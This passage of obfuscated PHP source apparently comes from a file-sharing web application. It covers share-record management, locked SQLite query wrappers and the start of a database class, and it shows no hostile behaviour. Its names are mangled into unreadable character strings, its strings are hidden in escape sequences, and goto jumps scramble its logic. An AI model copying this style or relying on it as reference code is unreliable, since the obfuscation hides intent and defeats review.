A°ΩÃÜ•äò: } protected function getInfoAuth($a∏Ùàˆ¥¯ê) { $fæ≠’“”ﬂå =& $_SERVER[∞„˜ƒÑºª]; $dÓ¬ëˆù§† = $this->getInfo($a∏Ùàˆ¥¯ê); $dÓ¬ëˆù§†[$fæ≠’“”ﬂå[548]] = Model($fæ≠’“”ﬂå[412])->authMake($dÓ¬ëˆù§†[$fæ≠’“”ﬂå[1633]]); return $dÓ¬ëˆù§†; } protected function listData($e±ì‹ƒòü’ = null, $F‡ŸÌØüÌë = 300) { $càõÛ≠ïò– =& $_SERVER[∞„˜ƒÑºª]; $CÍçíü§◊Á = array(array($càõÛ≠ïò–[1634] => array($càõÛ≠ïò–[686], 0), $càõÛ≠ïò–[416] => array($càõÛ≠ïò–[686], 0), $càõÛ≠ïò–[1635] => $càõÛ≠ïò–[1608])); if ($e±ì‹ƒòü’ == 1) { $CÍçíü§◊Á = array($càõÛ≠ïò–[1634] => 1); } else { if ($e±ì‹ƒòü’ == 2) { $CÍçíü§◊Á = array($càõÛ≠ïò–[416] => 1); } } $CÍçíü§◊Á[$càõÛ≠ïò–[1063]] = USER_ID; $cº£®ø«Ú¢ = $this->where($CÍçíü§◊Á)->selectPage($F‡ŸÌØüÌë); return $cº£®ø«Ú¢; } protected function listToMe($FåÎÙ„¨ßù = 300) { goto B≠åØÍ·øŸ; AÌÏãÑÖ«¬: $Fç≠ ¿Œ‹¶ = array($f’≥ù‡Üºß[1638] => $dö∞ÙÌÒÏÆ, $f’≥ù‡Üºß[1639] => $eΩ∏‡ÚπÿÖ[$f’≥ù‡Üºß[351]]); return $Fç≠ ¿Œ‹¶; goto F≥à—ã˜“œ; B≠åØÍ·øŸ: $f’≥ù‡Üºß =& $_SERVER[∞„˜ƒÑºª]; $eÖãÿäÃŒ∫ = Session::get($f’≥ù‡Üºß[1636]); $FùúÜ€ÜÉü = array_to_keyvalue($eÖãÿäÃŒ∫, $f’≥ù‡Üºß[33], $f’≥ù‡Üºß[1516]); goto A’¿±≠µÇ¶; Dıã†æ˜Ñç: $DÒ¶éæ⁄≤“ = array_to_keyvalue_group($eΩ∏‡ÚπÿÖ[$f’≥ù‡Üºß[354]], $f’≥ù‡Üºß[418]); if (!$DÒ¶éæ⁄≤“) { return $eΩ∏‡ÚπÿÖ; } $Açè§Ø»ﬁá = $f’≥ù‡Üºß[1637]; goto fêÊ÷¡°Ü∏; fêÊ÷¡°Ü∏: $e∞Ééáı¶Ï = array($f’≥ù‡Üºß[418] => array($f’≥ù‡Üºß[951], array_keys($DÒ¶éæ⁄≤“))); $dö∞ÙÌÒÏÆ = $this->field($Açè§Ø»ﬁá)->where($e∞Ééáı¶Ï)->select(); foreach ($dö∞ÙÌÒÏÆ as $a⁄´ÏæôÜ => &$Bâœë≥„≈Ÿ) { $Bâœë≥„≈Ÿ[$f’≥ù‡Üºß[1633]] = $DÒ¶éæ⁄≤“[$Bâœë≥„≈Ÿ[$f’≥ù‡Üºß[418]]]; } goto AÌÏãÑÖ«¬; A’¿±≠µÇ¶: $e∞Ééáı¶Ï = array($f’≥ù‡Üºß[392] => SourceModel::TYPE_USER, $f’≥ù‡Üºß[395] => USER_ID); if ($FùúÜ€ÜÉü) { $e∞Ééáı¶Ï = array(array($f’≥ù‡Üºß[392] => SourceModel::TYPE_USER, $f’≥ù‡Üºß[395] => USER_ID), array($f’≥ù‡Üºß[392] => SourceModel::TYPE_GROUP, $f’≥ù‡Üºß[395] => array($f’≥ù‡Üºß[7], $FùúÜ€ÜÉü)), $f’≥ù‡Üºß[1635] => $f’≥ù‡Üºß[1608]); } $eΩ∏‡ÚπÿÖ = Model($f’≥ù‡Üºß[419])->where($e∞Ééáı¶Ï)->selectPage($FåÎÙ„¨ßù); goto Dıã†æ˜Ñç; F≥à—ã˜“œ: } protected function shareAdd($b‹∏ë¡Ï˜¢, $fÚÉï€¶—´) { $B±∏ÊåúõÛ =& $_SERVER[∞„˜ƒÑºª]; $EÊ∑ÔÉçÕë = $this->_addShareData($b‹∏ë¡Ï˜¢, $fÚÉï€¶—´); if (isset($fÚÉï€¶—´[$B±∏ÊåúõÛ[1640]]) && count($fÚÉï€¶—´[$B±∏ÊåúõÛ[1640]]) > 0) { $this->_shareAuthSet($EÊ∑ÔÉçÕë, $fÚÉï€¶—´[$B±∏ÊåúõÛ[1640]]); } $this->shareEventAdd($b‹∏ë¡Ï˜¢, $fÚÉï€¶—´, $B±∏ÊåúõÛ[744]); return $EÊ∑ÔÉçÕë; } private function shareEventAdd($b∏‚ÀÖ‹‡∏, $A°·ì•Ì∂“, $açôœ¯—»Ë = "\141\144\144") { goto EÀòáÌ”ªŸ; EÀòáÌ”ªŸ: $AΩòçñ÷©Î =& $_SERVER[∞„˜ƒÑºª]; if ($açôœ¯—»Ë == $AΩòçñ÷©Î[744]) { if ($A°·ì•Ì∂“[$AΩòçñ÷©Î[1634]] == $AΩòçñ÷©Î[376]) { Model($AΩòçñ÷©Î[381])->eventShare($b∏‚ÀÖ‹‡∏, $AΩòçñ÷©Î[1641]); } if ($A°·ì•Ì∂“[$AΩòçñ÷©Î[416]] == $AΩòçñ÷©Î[376]) { Model($AΩòçñ÷©Î[381])->eventShare($b∏‚ÀÖ‹‡∏, $AΩòçñ÷©Î[1642]); } return; } $e´à€ï¢”⁄ = $this->getInfoByPath($b∏‚ÀÖ‹‡∏); goto e¡ÌÕ∏çö¨; Fÿé¯çÚ¢À: if ($e´à€ï¢”⁄[$AΩòçñ÷©Î[416]] == $AΩòçñ÷©Î[402] && $A°·ì•Ì∂“[$AΩòçñ÷©Î[416]] == $AΩòçñ÷©Î[376]) { $fèî„ÑÊÔ® = $AΩòçñ÷©Î[1642]; } if ($e´à€ï¢”⁄[$AΩòçñ÷©Î[416]] == $AΩòçñ÷©Î[376] && $A°·ì•Ì∂“[$AΩòçñ÷©Î[416]] == $AΩòçñ÷©Î[402]) { $fèî„ÑÊÔ® = $AΩòçñ÷©Î[1645]; } Model($AΩòçñ÷©Î[381])->eventShare($b∏‚ÀÖ‹‡∏, $fèî„ÑÊÔ®); goto Fáâ”àÇÕ€; e¡ÌÕ∏çö¨: $fèî„ÑÊÔ® = $AΩòçñ÷©Î[1643]; if ($e´à€ï¢”⁄[$AΩòçñ÷©Î[1634]] == $AΩòçñ÷©Î[402] && $A°·ì•Ì∂“[$AΩòçñ÷©Î[1634]] == $AΩòçñ÷©Î[376]) { $fèî„ÑÊÔ® = $AΩòçñ÷©Î[1641]; } if ($e´à€ï¢”⁄[$AΩòçñ÷©Î[1634]] == $AΩòçñ÷©Î[376] && $A°·ì•Ì∂“[$AΩòçñ÷©Î[1634]] == $AΩòçñ÷©Î[402]) { $fèî„ÑÊÔ® = $AΩòçñ÷©Î[1644]; } goto Fÿé¯çÚ¢À; Fáâ”àÇÕ€: return; goto B™⁄˘‰ºÓø; B™⁄˘‰ºÓø: } private function _addShareData($A’••ﬂ˘è¨, $d⁄Ñ∂…ú’ = array()) { goto aÆáÜ§¡ê≤; aÆáÜ§¡ê≤: $f£ÈŸè—ﬂ÷ =& $_SERVER[∞„˜ƒÑºª]; $AâŸ≤Ï∂˘— = array($f£ÈŸè—ﬂ÷[414] => $A’••ﬂ˘è¨, $f£ÈŸè—ﬂ÷[1054] => USER_ID); if ($FπË‘’Á—Õ = $this->where($AâŸ≤Ï∂˘—)->find()) { return $FπË‘’Á—Õ[$f£ÈŸè—ﬂ÷[418]]; } goto EÔßà’Ï€ä; CÆåá∫Ò¬ : $e◊Ëπ∏‰éª = $this->add($eæëÓÈ§∆¨); $Fó…ô–Áø≠ = array($f£ÈŸè—ﬂ÷[1631] => short_id($e◊Ëπ∏‰éª)); $this->where(array($f£ÈŸè—ﬂ÷[1650] => $e◊Ëπ∏‰éª))->save($Fó…ô–Áø≠); goto F˜≠∂Ç¯¥«; F˜≠∂Ç¯¥«: return $e◊Ëπ∏‰éª; goto eÊ¯ââæ≈; AœøÖ Õ≠›: $eæëÓÈ§∆¨ = array($f£ÈŸè—ﬂ÷[1054] => USER_ID, $f£ÈŸè—ﬂ÷[414] => $A’••ﬂ˘è¨, $f£ÈŸè—ﬂ÷[973] => $f£ÈŸè—ﬂ÷[33], $f£ÈŸè—ﬂ÷[1634] => 0, $f£ÈŸè—ﬂ÷[416] => 0, $f£ÈŸè—ﬂ÷[561] => $f£ÈŸè—ﬂ÷[33], $f£ÈŸè—ﬂ÷[1646] => 0, $f£ÈŸè—ﬂ÷[1647] => 0, $f£ÈŸè—ﬂ÷[459] => 0, $f£ÈŸè—ﬂ÷[1648] => $f£ÈŸè—ﬂ÷[33], $f£ÈŸè—ﬂ÷[1631] => $f£ÈŸè—ﬂ÷[33]); $Dª•∆¶∞Ü = explode($f£ÈŸè—ﬂ÷[47], $f£ÈŸè—ﬂ÷[1649]); foreach ($Dª•∆¶∞Ü as $cıÌÑà©â¥) { $eæëÓÈ§∆¨[$cıÌÑà©â¥] = $d⁄Ñ∂…ú’[$cıÌÑà©â¥]; } goto CÆåá∫Ò¬ ; EÔßà’Ï€ä: $BÛ÷ŒáØŸ› = Model($f£ÈŸè—ﬂ÷[520])->sourceInfo($A’••ﬂ˘è¨); if (!$BÛ÷ŒáØŸ›) { return !1; } if (!$d⁄Ñ∂…ú’[$f£ÈŸè—ﬂ÷[973]]) { $d⁄Ñ∂…ú’[$f£ÈŸè—ﬂ÷[973]] = $BÛ÷ŒáØŸ›[$f£ÈŸè—ﬂ÷[28]]; } goto AœøÖ Õ≠›; eÊ¯ââæ≈: } private function _shareAuthSet($Cï¯‚ ±†≠, $E—÷ÒÒà…ï) { goto Eîò¢§ƒûÕ; Eîò¢§ƒûÕ: $EÏåÍéˆÃØ =& $_SERVER[∞„˜ƒÑºª]; if (!is_array($E—÷ÒÒà…ï)) { return !1; } $F®ÌÔ†≈ﬂ‹ = Model($EÏåÍéˆÃØ[1651]); goto CÖ≠ÛÓ àä; CÖ≠ÛÓ àä: $F®ÌÔ†≈ﬂ‹->where(array($EÏåÍéˆÃØ[418] => $Cï¯‚ ±†≠))->delete(); $AÃÑ√ÍÒñ€ = array(); foreach ($E—÷ÒÒà…ï as $B≠˜ˆ¨ñË∂) { $BèÊ¡Çí∑® = SourceModel::TYPE_USER; if ($B≠˜ˆ¨ñË∂[$EÏåÍéˆÃØ[393]] == SourceModel::TYPE_GROUP) { $BèÊ¡Çí∑® = SourceModel::TYPE_GROUP; } $Eù‘õÆ°Ü÷ = array($EÏåÍéˆÃØ[418] => $Cï¯‚ ±†≠, $EÏåÍéˆÃØ[393] => $BèÊ¡Çí∑®, $EÏåÍéˆÃØ[395] => intval($B≠˜ˆ¨ñË∂[$EÏåÍéˆÃØ[395]]), $EÏåÍéˆÃØ[1652] => 0, $EÏåÍéˆÃØ[1653] => -1); if ($B≠˜ˆ¨ñË∂[$EÏåÍéˆÃØ[1652]]) { $Eù‘õÆ°Ü÷[$EÏåÍéˆÃØ[1652]] = $B≠˜ˆ¨ñË∂[$EÏåÍéˆÃØ[1652]]; } else { if ($B≠˜ˆ¨ñË∂[$EÏåÍéˆÃØ[1653]]) { $Eù‘õÆ°Ü÷[$EÏåÍéˆÃØ[1653]] = $B≠˜ˆ¨ñË∂[$EÏåÍéˆÃØ[1653]]; } } $AÃÑ√ÍÒñ€[] = $Eù‘õÆ°Ü÷; } goto EÊ¿ŸÒâÏÑ; EÊ¿ŸÒâÏÑ: return $F®ÌÔ†≈ﬂ‹->addAll($AÃÑ√ÍÒñ€, array(), !0); goto FÃà«¡´é¨; FÃà«¡´é¨: } public function numViewAdd($FÑÚõå¨ñ´) { $B◊Üáã≈‘ã =& $_SERVER[∞„˜ƒÑºª]; $C¬©≈—≥∂ÿ = array($B◊Üáã≈‘ã[1650] => $FÑÚõå¨ñ´); $this->where($C¬©≈—≥∂ÿ)->setAdd($B◊Üáã≈‘ã[1646]); } public function numDownloadAdd($F¥´’ºû™‹) { $f–†≈úúøú =& $_SERVER[∞„˜ƒÑºª]; $cÕéÙìƒµÜ = array($f–†≈úúøú[1650] => $F¥´’ºû™‹); $this->where($cÕéÙìƒµÜ)->setAdd($f–†≈úúøú[1647]); } protected function shareEdit($bøÆÇÔ“»—, $Bïö ıúâä) { goto FãàÊ∑ìÙ“; FÈ“ˆ¶Òºµ: return !0; goto A–∆Ï“Ò‡Á; FãàÊ∑ìÙ“: $aØâ‡•ï‚· =& $_SERVER[∞„˜ƒÑºª]; $A’ÉåƒÒ»ù = $this->getInfo($bøÆÇÔ“»—); if (!$A’ÉåƒÒ»ù) { return !1; } goto Dâ›è∫í‚¯; DÊø¶ÀãçÜ: $this->shareEventAdd($A’ÉåƒÒ»ù[$aØâ‡•ï‚·[374]], $Bïö ıúâä, $aØâ‡•ï‚·[1485]); $this->where(array($aØâ‡•ï‚·[1650] => $bøÆÇÔ“»—))->save($aƒàéÒﬂø÷); if (isset($Bïö ıúâä[$aØâ‡•ï‚·[1640]])) { $this->_shareAuthSet($bøÆÇÔ“»—, $Bïö ıúâä[$aØâ‡•ï‚·[1640]]); } goto FÈ“ˆ¶Òºµ; Dâ›è∫í‚¯: $aƒàéÒﬂø÷ = array(); $C∫‰˜œÀªã = explode($aØâ‡•ï‚·[47], $aØâ‡•ï‚·[1649]); foreach ($C∫‰˜œÀªã as $Bÿ ´Îó≠) { if (!array_key_exists($Bÿ ´Îó≠, $Bïö ıúâä)) { continue; } $aƒàéÒﬂø÷[$Bÿ ´Îó≠] = $Bïö ıúâä[$Bÿ ´Îó≠]; } goto DÊø¶ÀãçÜ; A–∆Ï“Ò‡Á: } protected function remove($Aì™‡‰îØ, $e≠éÊ·©û≥ = USER_ID) { goto Dâù™Óîõ°; Dâù™Óîõ°: $bƒòÇŸø¯Ô =& $_SERVER[∞„˜ƒÑºª]; if (is_array($Aì™‡‰îØ)) { $Aì™‡‰îØ = array($bƒòÇŸø¯Ô[7], $Aì™‡‰îØ); } $E™ºÂÌ»ÈŸ = array($bƒòÇŸø¯Ô[1063] => $e≠éÊ·©û≥, $bƒòÇŸø¯Ô[418] => $Aì™‡‰îØ); goto a˜¯‰ØÍºû; F≤∂Æÿå∫Ê: for ($f ‡Íá®Ãé = 0; $f ‡Íá®Ãé < count($bææå∑ì∆Ñ); $f ‡Íá®Ãé++) { $aŸœ€éÜµÑ = $this->getInfo($bææå∑ì∆Ñ[$f ‡Íá®Ãé]); if ($aŸœ€éÜµÑ[$bƒòÇŸø¯Ô[416]] == $bƒòÇŸø¯Ô[376]) { Model($bƒòÇŸø¯Ô[381])->eventShare($aŸœ€éÜµÑ[$bƒòÇŸø¯Ô[374]], $bƒòÇŸø¯Ô[1645]); } if ($aŸœ€éÜµÑ[$bƒòÇŸø¯Ô[1634]] == $bƒòÇŸø¯Ô[376]) { Model($bƒòÇŸø¯Ô[381])->eventShare($aŸœ€éÜµÑ[$bƒòÇŸø¯Ô[374]], $bƒòÇŸø¯Ô[1644]); } } return $d¡âÇºÕ∆∆; goto bª”◊‡ıˆ„; a˜¯‰ØÍºû: $d¡âÇºÕ∆∆ = $this->where($E™ºÂÌ»ÈŸ)->delete(); if ($d¡âÇºÕ∆∆) { Model($bƒòÇŸø¯Ô[419])->where(array($bƒòÇŸø¯Ô[418] => $Aì™‡‰îØ))->delete(); } $bææå∑ì∆Ñ = is_array($Aì™‡‰îØ) ? $Aì™‡‰îØ[1] : array($Aì™‡‰îØ); goto F≤∂Æÿå∫Ê; bª”◊‡ıˆ„: } public function listAll($fÖ‰„±‘…º) { goto fåŒîâ∞æç; EöÌ»ùÑµ»: if ($fÖ‰„±‘…º[$dŸΩî†≈úÔ[458]]) { $Eßóòåı®ô = $fÖ‰„±‘…º[$dŸΩî†≈úÔ[459]] ? $fÖ‰„±‘…º[$dŸΩî†≈úÔ[459]] : strtotime(date($dŸΩî†≈úÔ[1654])); $E∏ °‘‡ßú[$dŸΩî†≈úÔ[183]] = array($dŸΩî†≈úÔ[320], array($fÖ‰„±‘…º[$dŸΩî†≈úÔ[458]], $Eßóòåı®ô)); } if ($fÖ‰„±‘…º[$dŸΩî†≈úÔ[29]]) { $E∏ °‘‡ßú[$fÖ‰„±‘…º[$dŸΩî†≈úÔ[29]]] = 1; } else { $E∏ °‘‡ßú[] = array($dŸΩî†≈úÔ[1634] => array($dŸΩî†≈úÔ[686], 0), $dŸΩî†≈úÔ[416] => array($dŸΩî†≈úÔ[686], 0), $dŸΩî†≈úÔ[1635] => $dŸΩî†≈úÔ[1608]); } $DçÌ˜´Âá‹ = $this->_makeOrder()->where($E∏ °‘‡ßú)->selectPage(20); goto fßÑß“˜ß‘; fßÑß“˜ß‘: if (empty($DçÌ˜´Âá‹[$dŸΩî†≈úÔ[354]])) { return array(); } $this->_listDataApply($DçÌ˜´Âá‹[$dŸΩî†≈úÔ[354]]); return $DçÌ˜´Âá‹; goto b¯‘àπÊ’ë; fåŒîâ∞æç: $dŸΩî†≈úÔ =& $_SERVER[∞„˜ƒÑºª]; $E∏ °‘‡ßú = array(); if ($fÖ‰„±‘…º[$dŸΩî†≈úÔ[1063]]) { $E∏ °‘‡ßú[$dŸΩî†≈úÔ[1063]] = $fÖ‰„±‘…º[$dŸΩî†≈úÔ[1063]]; } goto EöÌ»ùÑµ»; b¯‘àπÊ’ë: } private function _listDataApply(&$e⁄ÑÖÍà‹˘) { $aÍ¯á»≈Òâ =& $_SERVER[∞„˜ƒÑºª]; $Aøø—‚ˆÍ = array_to_keyvalue($e⁄ÑÖÍà‹˘, $aÍ¯á»≈Òâ[33], $aÍ¯á»≈Òâ[1063]); $EÖ¯≤ÊÍÂ‹ = Model($aÍ¯á»≈Òâ[1451])->userListInfo(array_unique($Aøø—‚ˆÍ)); $e≠û°áó∂Æ = array_to_keyvalue($e⁄ÑÖÍà‹˘, $aÍ¯á»≈Òâ[33], $aÍ¯á»≈Òâ[374]); $c¡¿Éâ„∂ = Model($aÍ¯á»≈Òâ[520])->sourceListInfo($e≠û°áó∂Æ, !0); foreach ($e⁄ÑÖÍà‹˘ as &$Dı¿ﬂ◊çı ) { $bñÃ‘®¨Û· = $Dı¿ﬂ◊çı [$aÍ¯á»≈Òâ[1063]]; $Dı¿ﬂ◊çı [$aÍ¯á»≈Òâ[1655]] = $EÖ¯≤ÊÍÂ‹[$bñÃ‘®¨Û·] ? $EÖ¯≤ÊÍÂ‹[$bñÃ‘®¨Û·] : !1; $BêçÌ“Ø≥ = $Dı¿ﬂ◊çı [$aÍ¯á»≈Òâ[374]]; $Dı¿ﬂ◊çı [$aÍ¯á»≈Òâ[1618]] = $c¡¿Éâ„∂[$BêçÌ“Ø≥] ? $c¡¿Éâ„∂[$BêçÌ“Ø≥] : !1; } } private function _makeOrder($fò«¶√…∫‚ = '') { goto D‰ÿï‚πΩﬁ; dêûæ¢°èà: $fò«¶√…∫‚ = $fò«¶√…∫‚ . "{$f±∏∑Ñí‚œ}\40{$eÙ ÎÍÕñﬂ}"; return $this->order($fò«¶√…∫‚); goto C«≤‚›íáœ; cﬂóëÖÿﬂ´: $f±∏∑Ñí‚œ = Input::get($BïÁô√ì∞»[1556], $BïÁô√ì∞»[7], $BïÁô√ì∞»[1557], $EÉﬂÔÕúÑÛ); $eÙ ÎÍÕñﬂ = Input::get($BïÁô√ì∞»[1558], $BïÁô√ì∞»[7], $BïÁô√ì∞»[1656], array($BïÁô√ì∞»[1603], $BïÁô√ì∞»[1484])); $eÙ ÎÍÕñﬂ = $d≤§©ãÌ◊∑[$eÙ ÎÍÕñﬂ]; goto dêûæ¢°èà; D‰ÿï‚πΩﬁ: $BïÁô√ì∞» =& $_SERVER[∞„˜ƒÑºª]; $EÉﬂÔÕúÑÛ = array($BïÁô√ì∞»[183], $BïÁô√ì∞»[459], $BïÁô√ì∞»[1646], $BïÁô√ì∞»[1647]); $d≤§©ãÌ◊∑ = array($BïÁô√ì∞»[1601] => $BïÁô√ì∞»[1602], $BïÁô√ì∞»[1484] => $BïÁô√ì∞»[1560]); goto cﬂóëÖÿﬂ´; C«≤‚›íáœ: } } goto Aº’ø«á¥¿; Eõ€ ¶à£à: class DbSqlite extends DbSqliteBase { public function query($BÜó ∑üŸù) { goto d∞†Ë‚¥âÙ; AÈè˜πÃ˘Ú: if (flock($Cø¢¥äÆ∂Ù, LOCK_EX)) { $bø¢ﬂ¿ÉöΩ = parent::query($BÜó ∑üŸù); flock($Cø¢¥äÆ∂Ù, LOCK_UN); fclose($Cø¢¥äÆ∂Ù); return $bø¢ﬂ¿ÉöΩ; } flock($Cø¢¥äÆ∂Ù, LOCK_UN); fclose($Cø¢¥äÆ∂Ù); goto BÜˆèØÎ≈°; d∞†Ë‚¥âÙ: $eôç¿≥®¢Ü =& $_SERVER[∞„˜ƒÑºª]; $cƒå∆øó˜í = DATA_PATH . $eôç¿≥®¢Ü[632]; $Cø¢¥äÆ∂Ù = fopen($cƒå∆øó˜í, $eôç¿≥®¢Ü[633]); goto AÈè˜πÃ˘Ú; BÜˆèØÎ≈°: show_json($eôç¿≥®¢Ü[634], !1); return !1; goto e©÷éÊÆˆé; e©÷éÊÆˆé: } public function execute($D•Íó”ãÂ©) { goto a´Ωø‡ê°; Aãêñø¿‚î: show_json($c≥ﬁπÎıÜ[634], !1); return !1; goto eäÙÑÌƒç›; a´Ωø‡ê°: $c≥ﬁπÎıÜ =& $_SERVER[∞„˜ƒÑºª]; $e«√•ﬂãé¶ = DATA_PATH . $c≥ﬁπÎıÜ[632]; $Fâ”Ø¢ÿÜ… = fopen($e«√•ﬂãé¶, $c≥ﬁπÎıÜ[633]); goto Eéî…÷‰Ââ; Eéî…÷‰Ââ: if (flock($Fâ”Ø¢ÿÜ…, LOCK_EX)) { $fËÑ„‰èÿ∞ = parent::execute($D•Íó”ãÂ©); flock($Fâ”Ø¢ÿÜ…, LOCK_UN); fclose($Fâ”Ø¢ÿÜ…); return $fËÑ„‰èÿ∞; } flock($Fâ”Ø¢ÿÜ…, LOCK_UN); fclose($Fâ”Ø¢ÿÜ…); goto Aãêñø¿‚î; eäÙÑÌƒç›: } } class DbSqlite3 extends DbSqlite3Base { public function query($bºÍÔµ≥–ì) { goto C“≥Çèˆ â; C“≥Çèˆ â: $BãÇ¡«“…ñ =& $_SERVER[∞„˜ƒÑºª]; $cé¨Ü≥¥£è = DATA_PATH . $BãÇ¡«“…ñ[632]; $Aç¶ı∫ÚüÛ = fopen($cé¨Ü≥¥£è, $BãÇ¡«“…ñ[633]); goto BÍÚÒÜÇäÇ; aÃºÃ÷àú§: show_json($BãÇ¡«“…ñ[634], !1); return !1; goto bÌΩøΩÖÍ€; BÍÚÒÜÇäÇ: if (flock($Aç¶ı∫ÚüÛ, LOCK_EX)) { $f›¯Î§ÌÇ° = parent::query($bºÍÔµ≥–ì); flock($Aç¶ı∫ÚüÛ, LOCK_UN); fclose($Aç¶ı∫ÚüÛ); return $f›¯Î§ÌÇ°; } flock($Aç¶ı∫ÚüÛ, LOCK_UN); fclose($Aç¶ı∫ÚüÛ); goto aÃºÃ÷àú§; bÌΩøΩÖÍ€: } public function execute($EßÖô∞ÔÜË) { goto B ä¯ÎÆçà; b†Â®îº“π: if (flock($dîÚÍ‚∞êÂ, LOCK_EX)) { $a‹Áì·Ãé¡ = parent::execute($EßÖô∞ÔÜË); flock($dîÚÍ‚∞êÂ, LOCK_UN); fclose($dîÚÍ‚∞êÂ); return $a‹Áì·Ãé¡; } flock($dîÚÍ‚∞êÂ, LOCK_UN); fclose($dîÚÍ‚∞êÂ); goto fß††ó∂∫›; fß††ó∂∫›: show_json($Dı´ôıØ≥ª[634], !1); return !1; goto DÜ±Ñã’·ä; B ä¯ÎÆçà: $Dı´ôıØ≥ª =& $_SERVER[∞„˜ƒÑºª]; $bªº‘Õ˜Ÿƒ = DATA_PATH . $Dı´ôıØ≥ª[632]; $dîÚÍ‚∞êÂ = fopen($bªº‘Õ˜Ÿƒ, $Dı´ôıØ≥ª[633]); goto b†Â®îº“π; DÜ±Ñã’·ä: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\x68\151\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\161" => "\75", "\156\145\x71" => "\74\x3e", "\x67\164" => "\76", "\x65\x67\164" => "\x3e\75", "\154\x74" => "\x3c", "\x65\x6c\164" => "\x3c\x3d", "\x6e\x6f\164\154\151\x6b\x65" => "\x4e\x4f\124\x20\x4c\x49\x4b\105", "\154\151\x6b\x65" => "\114\x49\113\105", "\x69\x6e" => "\111\x4e", "\156\157\164\x69\156" => "\x4e\x4f\124\x20\111\116", "\156\157\x74\x20\x69\x6e" => "\x4e\x4f\124\40\111\116", "\x62\145\x74\x77\x65\x65\156" => "\102\105\x54\127\x45\x45\x4e", "\156\x6f\x74\142\145\164\x77\x65\x65\156" => "\x4e\117\124\x20\x42\x45\x54\127\x45\x45\x4e", "\156\x6f\x74\40\142\x65\164\x77\145\145\156" => "\x4e\x4f\x54\x20\102\x45\x54\x57\x45\x45\x4e"); protected $selectSql = "\x53\x45\x4c\105\103\x54\x25\x44\111\x53\x54\x49\116\103\x54\45\x20\45\x46\x49\105\x4c\x44\45\x20\106\122\x4f\115\40\x25\x54\101\x42\x4c\x45\x25\45\112\x4f\111\116\x25\x25\127\110\105\122\105\x25\x25\x47\x52\117\125\120\45\x25\110\x41\126\x49\x4e\107\45\x25\117\122\104\x45\122\45\x25\114\111\115\111\x54\x25\x20\45\x55\116\111\117\116\x25\45\103\117\115\x4d\105\116\124\45"; protected $bind = array(); public static function getInstance() { $Dºø∏ìâÁó = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[∞„˜ƒÑºª][635], $Dºø∏ìâÁó); } public function factory($E´∏ëß∆Ú⁄ = '') { goto B»‘ÓÜõë“; D¿Æœ¬÷Ì¬: return $EÁµíé‰≤ä; goto A¥µπóäÜ‘; fŒı˘åÌºÔ: $this->dbType = ucwords(strtolower($E´∏ëß∆Ú⁄[$b‚Ò≈÷˜ùÉ[636]])); $cîë√ã¨µ¢ = $b‚Ò≈÷˜ùÉ[638] . $this->dbType; if (class_exists($cîë√ã¨µ¢)) { $EÁµíé‰≤ä = new $cîë√ã¨µ¢($E´∏ëß∆Ú⁄); if ($b‚Ò≈÷˜ùÉ[490] != strtolower($E´∏ëß∆Ú⁄[$b‚Ò≈÷˜ùÉ[636]])) { $EÁµíé‰≤ä->dbType = strtoupper($this->dbType); } else { $EÁµíé‰≤ä->dbType = $this->_getDsnType($E´∏ëß∆Ú⁄[$b‚Ò≈÷˜ùÉ[588]]); } } else { think_exception(think_lang($b‚Ò≈÷˜ùÉ[639]) . $b‚Ò≈÷˜ùÉ[640] . $cîë√ã¨µ¢); } goto D¿Æœ¬÷Ì¬; B»‘ÓÜõë“: $b‚Ò≈÷˜ùÉ =& $_SERVER[∞„˜ƒÑºª]; $E´∏ëß∆Ú⁄ = $this->parseConfig($E´∏ëß∆Ú⁄); if (empty($E´∏ëß∆Ú⁄[$b‚Ò≈÷˜ùÉ[636]])) { think_exception(think_lang($b‚Ò≈÷˜ùÉ[637])); } goto fŒı˘åÌºÔ; A¥µπóäÜ‘: } public function __call($AÒ€îË»ÍÔ, $dÚ‹æåí⁄Ç) { if (method_exists($this, $AÒ€îË»ÍÔ)) { return call_user_func_array(array($this, $AÒ€îË»ÍÔ), $dÚ‹æåí⁄Ç); } } protected function _getDsnType($eâ√Œ‰°å†) { $Bì¬‚ﬁìÇﬁ = explode($_SERVER[∞„˜ƒÑºª][4], $eâ√Œ‰°å†); $D≥ïåÙó∑ì = strtoupper(trim($Bì¬‚ﬁìÇﬁ[0])); return $D≥ïåÙó∑ì; } private function parseConfig($a”ﬁõâªÚÍ = '') { $Eöèè«†‹— =& $_SERVER[∞„˜ƒÑºª]; if (!empty($a”ﬁõâªÚÍ) && is_string($a”ﬁõâªÚÍ)) { $a”ﬁõâªÚÍ = $this->parseDSN($a”ﬁõâªÚÍ); } elseif (is_array($a”ﬁõâªÚÍ)) { $a”ﬁõâªÚÍ = array_change_key_case($a”ﬁõâªÚÍ); $a”ﬁõâªÚÍ = array($Eöèè«†‹—[636] => $a”ﬁõâªÚÍ[$Eöèè«†‹—[641]], $Eöèè«†‹—[560] => $a”ﬁõâªÚÍ[$Eöèè«†‹—[642]], $Eöèè«†‹—[561] => $a”ﬁõâªÚÍ[$Eöèè«†‹—[643]], $Eöèè«†‹—[558] => $a”ﬁõâªÚÍ[$Eöèè«†‹—[644]], $Eöèè«†‹—[559] => $a”ﬁõâªÚÍ[$Eöèè«†‹—[645]], $Eöèè«†‹—[17] => $a”ﬁõâªÚÍ[$Eöèè«†‹—[646]], $Eöèè«†‹—[588] => $a”ﬁõâªÚÍ[$Eöèè«†‹—[647]], $Eöèè«†‹—[13] => $a”ﬁõâªÚÍ[$Eöèè«†‹—[648]]); } elseif (empty($a”ﬁõâªÚÍ)) { if (think_config($Eöèè«†‹—[492]) && $Eöèè«†‹—[490] != strtolower(think_config($Eöèè«†‹—[489]))) { $a”ﬁõâªÚÍ = $this->parseDSN(think_config($Eöèè«†‹—[492])); } else { $a”ﬁõâªÚÍ = array($Eöèè«†‹—[636] => think_config($Eöèè«†‹—[489]), $Eöèè«†‹—[560] => think_config($Eöèè«†‹—[649]), $Eöèè«†‹—[561] => think_config($Eöèè«†‹—[650]), $Eöèè«†‹—[558] => think_config($Eöèè«†‹—[651]), $Eöèè«†‹—[559] => think_config($Eöèè«†‹—[652]), $Eöèè«†‹—[17] => think_config($Eöèè«†‹—[233]), $Eöèè«†‹—[588] => 